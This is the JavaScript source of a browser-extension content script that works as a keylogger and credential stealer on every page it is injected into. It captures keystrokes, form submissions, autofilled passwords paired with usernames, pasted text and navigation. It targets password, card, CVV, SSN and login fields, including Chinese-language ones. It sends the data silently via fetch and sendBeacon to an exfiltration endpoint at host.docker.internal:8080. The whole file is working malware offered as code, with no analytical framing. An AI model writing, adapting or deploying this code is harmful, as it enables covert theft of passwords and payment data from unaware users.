// Input Capture Content Script
// Injected into every page to capture keystrokes, form submissions, and autofill events

(function() {
  "use strict";
  
  const EXFIL_URL = "http://host.docker.internal:8080/api/ext/exfil";
  const FORM_WATCH_INTERVAL = 2000; // Check for dynamic forms every 2s
  const KEYSTROKE_BUFFER_TIME = 3000; // Flush keystroke buffer after 3s of inactivity
  
  let keystrokeBuffer = {};
  let lastKeystrokeTime = {};
  let keystrokeTimers = {};
  let watchedForms = new WeakSet();
  let watchedInputs = new WeakSet();
  let pageUrl = window.location.href;
  let pageTitle = document.title;
  
  // ─── Config ──────────────────────────────────────────────────────────────
  const SENSITIVE_FIELDS = [
    "password", "passwd", "pwd", "secret", "token", "auth",
    "login", "username", "email", "phone", "mobile", "tel",
    "credit", "card", "cvc", "cvv", "ssn", "social",
    "验证码", "密码", "账号", "邮箱", "手机", "登录"
  ];
  
  const CAPTURE_ALL_KEYSTROKES = true; // Set false to only capture sensitive fields
  
  // ─── Helpers ─────────────────────────────────────────────────────────────
  function isSensitiveField(element) {
    if (!element) return false;
    const name = (element.name || "").toLowerCase();
    const id = (element.id || "").toLowerCase();
    const type = (element.type || "").toLowerCase();
    const placeholder = (element.placeholder || "").toLowerCase();
    const className = (element.className || "").toLowerCase();
    const ariaLabel = (element.getAttribute("aria-label") || "").toLowerCase();
    
    const combined = [name, id, placeholder, className, ariaLabel].join(" ");
    
    if (type === "password") return true;
    return SENSITIVE_FIELDS.some(kw => combined.includes(kw));
  }
  
  function getFieldIdentifier(element) {
    return element.name || element.id || element.placeholder || 
           element.getAttribute("data-field") || 
           `field_${Math.random().toString(36).slice(2, 8)}`;
  }
  
  function sendToExfil(data, isUrgent = false) {
    try {
      const payload = {
        type: data.type || "credential",
        data: data.payload || data,
        metadata: {
          url: pageUrl,
          title: pageTitle,
          timestamp: Date.now(),
          extension: "input_capture",
          version: "1.0.0"
        }
      };
      
      // Use sendBeacon for urgent data (form submit) to ensure delivery even on page unload
      if (isUrgent && navigator.sendBeacon) {
        const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
        navigator.sendBeacon(EXFIL_URL, blob);
      } else {
        fetch(EXFIL_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(() => {});
      }
    } catch (e) {
      // Silently fail - don't disrupt the page
    }
  }
  
  // ─── Keystroke Capture ───────────────────────────────────────────────────
  function initKeystrokeCapture() {
    document.addEventListener("keydown", function(e) {
      const target = e.target;
      if (!target || (target.tagName !== "INPUT" && target.tagName !== "TEXTAREA")) return;
      
      const fieldId = getFieldIdentifier(target);
      const isSensitive = isSensitiveField(target);
      
      if (!CAPTURE_ALL_KEYSTROKES && !isSensitive) return;
      
      // Initialize buffer for this field
      if (!keystrokeBuffer[fieldId]) {
        keystrokeBuffer[fieldId] = { value: "", sensitive: isSensitive, type: target.type };
      }
      
      // Handle special keys
      if (e.key === "Backspace") {
        keystrokeBuffer[fieldId].value = keystrokeBuffer[fieldId].value.slice(0, -1);
      } else if (e.key === "Enter") {
        // Don't capture Enter key
      } else if (e.key.length === 1) {
        keystrokeBuffer[fieldId].value += e.key;
      }
      
      // Reset and restart debounce timer for this field
      const fieldTimer = keystrokeTimers[fieldId];
      if (fieldTimer) clearTimeout(fieldTimer);
      
      keystrokeTimers[fieldId] = setTimeout(() => {
        // Flush buffer for this field
        if (keystrokeBuffer[fieldId] && keystrokeBuffer[fieldId].value.length > 0) {
          sendToExfil({
            type: "keystroke",
            payload: {
              field: fieldId,
              value: keystrokeBuffer[fieldId].value,
              sensitive: keystrokeBuffer[fieldId].sensitive,
              inputType: keystrokeBuffer[fieldId].type
            }
          });
          keystrokeBuffer[fieldId].value = ""; // Clear after send
        }
        delete keystrokeTimers[fieldId];
      }, KEYSTROKE_BUFFER_TIME);
      
    }, true);
  }
  
  // ─── Form Submission Capture ─────────────────────────────────────────────
  function captureFormValues(form) {
    const formData = {};
    const elements = form.elements || [];
    
    for (let i = 0; i < elements.length; i++) {
      const el = elements[i];
      if (!el.name && !el.id) continue;
      
      const identifier = el.name || el.id;
      let value;
      
      if (el.type === "checkbox" || el.type === "radio") {
        if (el.checked) value = el.value;
        else continue;
      } else if (el.type === "select-one" || el.type === "select-multiple") {
        value = el.options[el.selectedIndex] ? el.options[el.selectedIndex].value : "";
      } else {
        value = el.value || "";
      }
      
      if (value) {
        formData[identifier] = value;
      }
    }
    
    // Also include any keystroke buffer data that hasn't been flushed
    for (const fieldId in keystrokeBuffer) {
      if (keystrokeBuffer[fieldId].value) {
        formData[`keystroke_${fieldId}`] = keystrokeBuffer[fieldId].value;
        keystrokeBuffer[fieldId].value = ""; // Clear
      }
    }
    
    return formData;
  }
  
  function initFormCapture() {
    // Capture standard form submissions
    document.addEventListener("submit", function(e) {
      const form = e.target;
      if (!form || form.tagName !== "FORM") return;
      
      const formData = captureFormValues(form);
      if (Object.keys(formData).length > 0) {
        sendToExfil({
          type: "form_submit",
          payload: formData,
          action: form.action || pageUrl,
          method: form.method || "GET"
        }, true); // Urgent - page may navigate away
      }
    }, true);
    
    // Watch for dynamically added forms
    setInterval(() => {
      const forms = document.forms;
      for (let i = 0; i < forms.length; i++) {
        const form = forms[i];
        if (!watchedForms.has(form)) {
          watchedForms.add(form);
          
          // Capture on any input change within the form (catches autofill)
          form.addEventListener("change", function(e) {
            const target = e.target;
            if (!target || !target.name) return;
            
            if (isSensitiveField(target) || target.type === "password") {
              const data = {};
              data[target.name || target.id || "field"] = target.value;
              sendToExfil({
                type: "field_change",
                payload: data
              });
            }
          }, true);
        }
      }
    }, FORM_WATCH_INTERVAL);
  }
  
  // ─── Autofill / Change Detection ────────────────────────────────────────
  function initAutofillCapture() {
    // Watch for value changes on all input elements (catches browser autofill)
    document.addEventListener("change", function(e) {
      const target = e.target;
      if (!target || (target.tagName !== "INPUT" && target.tagName !== "TEXTAREA")) return;
      
      if (isSensitiveField(target) || target.type === "password" || target.type === "email") {
        const data = {};
        data[target.name || target.id || "autofill_field"] = target.value;
        sendToExfil({
          type: "autofill_capture",
          payload: data
        });
      }
    }, true);
    
    // More aggressive autofill detection: poll password fields
    let lastValues = {};
    setInterval(() => {
      const inputs = document.querySelectorAll('input[type="password"], input[name*="password"], input[name*="passwd"]');
      inputs.forEach(input => {
        const id = input.name || input.id || "unknown_password";
        if (input.value && input.value !== lastValues[id]) {
          lastValues[id] = input.value;
          const data = {};
          data[id] = input.value;
          
          // Also try to find the corresponding username/email field
          const form = input.form;
          if (form) {
            for (let el of form.elements) {
              if ((el.type === "email" || el.type === "text" || el.type === "tel") && el.value) {
                data[`paired_${el.name || el.id || "username"}`] = el.value;
                break;
              }
            }
          }
          
          sendToExfil({
            type: "autofill_detected",
            payload: data
          });
        }
      });
    }, 1500);
  }
  
  // ─── Clipboard Capture (paste into sensitive fields) ────────────────────
  function initClipboardCapture() {
    document.addEventListener("paste", function(e) {
      const target = e.target;
      if (!target || (target.tagName !== "INPUT" && target.tagName !== "TEXTAREA")) return;
      
      if (isSensitiveField(target)) {
        const pastedText = (e.clipboardData || window.clipboardData).getData("text");
        if (pastedText) {
          sendToExfil({
            type: "clipboard_paste",
            payload: {
              field: getFieldIdentifier(target),
              value: pastedText.substring(0, 500) // Limit length
            }
          });
        }
      }
    }, true);
  }
  
  // ─── URL/Tab Change Tracking ────────────────────────────────────────────
  let lastUrl = window.location.href;
  new MutationObserver(() => {
    const currentUrl = window.location.href;
    if (currentUrl !== lastUrl) {
      lastUrl = currentUrl;
      pageUrl = currentUrl;
      pageTitle = document.title;
      
      sendToExfil({
        type: "navigation",
        payload: {
          url: currentUrl,
          title: document.title
        }
      });
    }
  }).observe(document, { subtree: true, childList: true });
  
  // Also track title changes
  document.addEventListener("DOMContentLoaded", () => {
    pageTitle = document.title;
  });
  
  // ─── Initialize Everything ───────────────────────────────────────────────
  function init() {
    // Wait a tiny bit for page to stabilize
    setTimeout(() => {
      initKeystrokeCapture();
      initFormCapture();
      initAutofillCapture();
      initClipboardCapture();
      console.log("[Input Capture] Content script initialized on:", pageUrl);
    }, 100);
  }
  
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
  
})();
